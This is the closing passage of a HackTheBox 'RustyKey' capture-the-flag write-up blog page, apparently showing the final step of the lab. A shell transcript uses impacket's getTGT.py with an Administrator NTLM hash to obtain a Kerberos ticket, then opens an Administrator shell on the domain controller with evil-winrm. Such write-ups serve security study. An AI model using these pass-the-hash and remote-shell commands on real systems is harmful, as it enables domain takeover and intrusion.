<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&#x27;+28800s&#x27;</span> getTGT.py <span class="string">&#x27;rustykey.htb/Administrator&#x27;</span> -hashes :f7a351e12f70cc177a1d5bd11b28ac26 -dc-ip 10.129.165.216</span><br><span class="line">/usr/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated <span class="keyword">for</span> removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools&lt;81.</span><br><span class="line">  import pkg_resources</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator.ccache</span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [16:02:57]</span></span><br><span class="line">$ <span class="built_in">export</span> KRB5CCNAME=Administrator.ccache                                </span><br><span class="line"><span class="comment"># wansh @ Athena in ~/HackTheBox/RustyKey  [16:03:02]</span></span><br><span class="line">$ faketime -f <span class="string">&#x27;+28799s&#x27;</span> evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB                                                         </span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </span><br></pre></td></tr></table></figure>
  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">首页</a></li>
        
          <li><a href="/about/">关于</a></li>
        
          <li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li>
        
          <li><a href="https://n0nome.github.io/tags/random/">random</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-number">1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timeroasting"><span class="toc-number">2.</span> <span class="toc-text">timeroasting</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#hashcat-crack-and-password-sparying"><span class="toc-number">2.1.</span> <span class="toc-text">hashcat crack and password sparying</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-as-bb-margan"><span class="toc-number">3.</span> <span class="toc-text">shell as bb.margan</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#continue-with-next-day"><span class="toc-number">3.1.</span> <span class="toc-text">continue with next day</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&text=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&is_video=false&description=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HackTheBox——HTB Rustykey Writeup&body=Check out this article: https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&title=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&name=HackTheBox——HTB Rustykey Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://n0nome.github.io/2025/07/02/Rustykey/RustyKey/&t=HackTheBox——HTB Rustykey Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    n0nome
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/writeup/">writeup</a></li><!--
     --><!--
       --><li><a href="https://n0nome.github.io/tags/random/">random</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "复制成功！");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?8805a0d3f14df2c09dd76694ea3b92b7";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->


</body>
</html>
